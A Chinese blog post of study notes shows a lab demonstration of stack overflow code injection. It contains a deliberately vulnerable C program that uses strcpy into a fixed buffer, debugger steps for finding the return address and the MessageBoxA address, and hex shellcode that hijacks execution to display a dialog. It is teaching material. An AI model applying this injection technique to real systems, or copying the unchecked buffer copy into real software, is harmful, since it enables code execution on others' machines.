---
layout:     post
title:      0day漏洞学习（三）：栈溢出漏洞注入代码
subtitle:   利用栈溢出植入想要执行的代码。
date:       2021-04-10
author:     Hongtai S
header-img: img/post-bg-hacker.jpg
catalog: true
tags:
    - 漏洞
    - 二进制
    - 代码注入
---

# 理论分析 #
上一节中通过栈溢出漏洞成功利用字符串截断符0x00将authenticated变量覆盖，修改判断条件并通过密码验证，但是实际上像"anthenticated"这种变量并不多见，真正能够引起黑客注意的是下一地址的“返回地址”，当函数执行结束后，程序执行流会跳转到返回地址，并继续执行，当我们覆盖返回地址时，岂不是将函数返回到任何我们想要的地址。而恰好我们将想要执行的机器指令写入栈，将返回地址覆盖为指令的起始地址，这样程序就会执行我们写入的命令。原理如下图：

![原理图.PNG](https://i.loli.net/2021/04/10/g3zLQVBOJWA6j94.png)

# 实验 #

实验代码如下
代码中多了windows.h库，为了方便程序顺利调用LoadLibrary()装载user32.dll；
buffer字符串扩充为44个字符，为了方便装入注入的代码；
LoadLibrary("user32.dll")用于初始化装载user32.dll，以便在植入代、码中调用 MessageBox。

```cpp,c

#include <stdio.h>
#include <string.h>
#include <windows.h> 
#define PASSWORD "1234567" 
int verify_password (char *password) 
{ 
    int authenticated; 
    char buffer[44]; 
    authenticated=strcmp(password,PASSWORD); 
    strcpy(buffer,password); 
    return authenticated; 
} 
main() 
{ 
    int valid_flag=0; 
    char password[1024]; 
    FILE * fp; 
    LoadLibrary("user32.dll");
    if(!(fp=fopen("password.txt","rw+"))) 
    { 
        exit(0); 
    } 
    fscanf(fp,"%s",password); 
    valid_flag = verify_password(password); 
    if(valid_flag) 
    { 
        printf("incorrect password!\n"); 
    } 
    else 
    { 
        printf("Congratulation! You have passed the verification!\n"); 
    } 
    fclose(fp); 
} 

```

首先创建password.txt，写入14个“4321”，用ollydby调试观察内存栈情况：

![栈状态.PNG](https://i.loli.net/2021/04/10/Ru1hxH42pQMJZmi.png)

4321可成功淹没返回地址，shellcode的初始地址为0x0012FAF0

编辑shellcode：
注入的代码主要功能是弹出对话框，需要调用MessageBoxA()函数，因此需要先获取MessageBoxA的入口地址，用Depency Walker随便打开一个有GUI元素的进程，找到user32.dll的装载基址，并找到MessageBoxA()函数的入口点：

![dependency.PNG](https://i.loli.net/2021/04/10/mJS54kIiDxltb6Y.png)

得到装载基址和入口点分别为0x77D10000和0x0004050B，
因此函数在内存中的地址为0x77D10000+0x0004050B = 0x77D5050B

得到shellcode：
\x33\xDB\x53\x66\x77\x65\x73\x74
\x68\x66\x61\x69\x6C\x8B\xC4\x53
\x53\x50\x50\x53\xB8\x0B\x05\xD5
\x77\xFF\xD0\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x99
\x9D\x90\x90\x90\x90\xF0\xFA\x12
\x00

执行程序：

![success.PNG](https://i.loli.net/2021/04/10/yHJxCbgBsZdv1tq.png)

成功注入！